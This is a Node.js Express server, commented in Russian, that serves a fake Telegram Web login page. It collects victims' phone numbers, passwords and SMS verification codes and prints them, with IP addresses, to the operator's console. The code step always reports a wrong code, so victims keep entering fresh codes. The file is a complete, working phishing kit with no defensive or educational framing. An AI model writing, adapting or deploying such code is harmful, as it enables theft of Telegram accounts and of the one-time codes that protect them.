const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Создаем папку public если её нет
const publicDir = path.join(__dirname, 'public');
if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });

// Создаем index.html если его нет
const indexPath = path.join(publicDir, 'index.html');
if (!fs.existsSync(indexPath)) {
    const htmlContent = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Telegram Web</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial;background:linear-gradient(135deg,#2a2a2a,#1a1a2e);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.container{background:white;border-radius:28px;width:100%;max-width:400px;padding:40px;text-align:center;box-shadow:0 25px 50px -12px rgba(0,0,0,0.5)}
.logo svg{width:80px;height:80px}
h2{margin:20px 0;color:#333}
.input-group{margin:15px 0}
.input-group input{width:100%;padding:14px;border:2px solid #ddd;border-radius:16px;font-size:16px}
button{width:100%;padding:14px;background:#27A5E7;color:white;border:none;border-radius:16px;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
button:hover{background:#1e8bc3}
.error{background:#fee;color:#c33;padding:12px;border-radius:16px;margin-top:15px;display:none}
.code-step{display:none}
.back-link{margin-top:15px}
.back-link a{color:#888;text-decoration:none;font-size:14px}
</style></head>
<body>
<div class="container"><div class="logo"><svg viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#27A5E7"/><path fill="white" d="M98,175c-3.9,0-4.2-1.6-6-5.8l-15-49l84-54l-104,42l-32,13c-6,2-6,5.7-1.1,7.9l26,8l60-38c2.5-1.5,4.8-0.7,2.9,0.9L98,175z"/></svg></div><h2 id="title">Вход в Telegram</h2>
<div id="step1"><form id="loginForm"><div class="input-group"><input type="tel" id="phone" placeholder="+7 (900) 123-45-67" required></div><div class="input-group"><input type="password" id="password" placeholder="Пароль" required></div><button type="submit">Продолжить</button></form></div>
<div id="step2" class="code-step"><form id="codeForm"><div class="input-group"><input type="text" id="code" placeholder="Код из SMS" maxlength="6" required></div><button type="submit">Подтвердить</button><div class="back-link"><a href="#" onclick="back()">← Использовать другой номер</a></div></form></div>
<div class="error" id="error"></div></div>
<script>
let userPhone='',userPassword='';
document.getElementById('loginForm')?.addEventListener('submit',async(e)=>{
e.preventDefault();userPhone=document.getElementById('phone').value;userPassword=document.getElementById('password').value;
if(!userPhone||!userPassword)return showError('Заполните поля');
try{let r=await fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:userPhone,password:userPassword,step:1})});
let d=await r.json();
if(d.success){document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';document.getElementById('title').innerText='Подтверждение входа';}
else showError(d.error||'Ошибка');}catch(e){showError('Ошибка соединения');}});
document.getElementById('codeForm')?.addEventListener('submit',async(e)=>{
e.preventDefault();let code=document.getElementById('code').value;
if(!code||code.length<5)return showError('Введите код');
try{let r=await fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:userPhone,password:userPassword,code:code,step:2})});
let d=await r.json();showError(d.error||'Неверный код');document.getElementById('code').value='';
}catch(e){showError('Ошибка');}});
function showError(msg){let e=document.getElementById('error');e.innerText=msg;e.style.display='block';setTimeout(()=>e.style.display='none',3000);}
function back(){document.getElementById('step2').style.display='none';document.getElementById('step1').style.display='block';document.getElementById('title').innerText='Вход в Telegram';document.getElementById('code').value='';document.getElementById('phone').value='';document.getElementById('password').value='';}
</script></body></html>`;
    fs.writeFileSync(indexPath, htmlContent);
    console.log('✅ Создан index.html');
}

app.use(express.static(publicDir));

app.get('/', (req, res) => res.sendFile(indexPath));

app.post('/api/submit', (req, res) => {
    const { phone, password, code, step } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.ip;
    const time = new Date().toLocaleString();
    
    console.log('\n' + '='.repeat(60));
    console.log(`[${time}] НОВЫЕ ДАННЫЕ`);
    console.log('='.repeat(60));
    
    if (step === 1) {
        console.log(`📱 Номер: ${phone}`);
        console.log(`🔑 Пароль: ${password}`);
        console.log(`🌐 IP: ${ip}`);
        res.json({ success: true, message: 'Код отправлен' });
    } else if (step === 2) {
        console.log(`📱 Номер: ${phone}`);
        console.log(`📲 Код: ${code}`);
        console.log(`🌐 IP: ${ip}`);
        res.json({ success: false, error: 'Неверный код' });
    }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🚀 Сервер запущен на порту ${port}`);
    console.log(`📱 Доступен по адресу: http://localhost:${port}`);
});
